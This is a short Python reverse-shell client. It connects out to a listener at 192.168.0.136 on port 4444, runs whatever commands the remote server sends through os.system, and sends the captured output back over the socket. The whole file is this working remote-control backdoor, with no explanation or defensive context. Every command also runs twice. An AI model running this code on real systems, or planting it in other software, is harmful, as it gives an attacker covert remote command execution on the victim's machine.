import sys
import socket
import os

SERVER = "192.168.0.136"
PORT = 4444

s = socket.socket()
s.connect((SERVER, PORT))
msg = s.recv(4096 * 4096).decode()
print('[*] server:', msg)

while True:
    cmd = s.recv(4096 * 4096).decode()
    print(f'[+] received command: {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    try:
       
        ss = "temp.txt"
        
        
        result = os.system(f"{cmd} > {ss} 2>&1")
        os.system(cmd)
        f = open("temp.txt", "rb")
        j = f.read()
        s.send(j)
    except Exception as e:
        result = str(e).encode()

s.close()
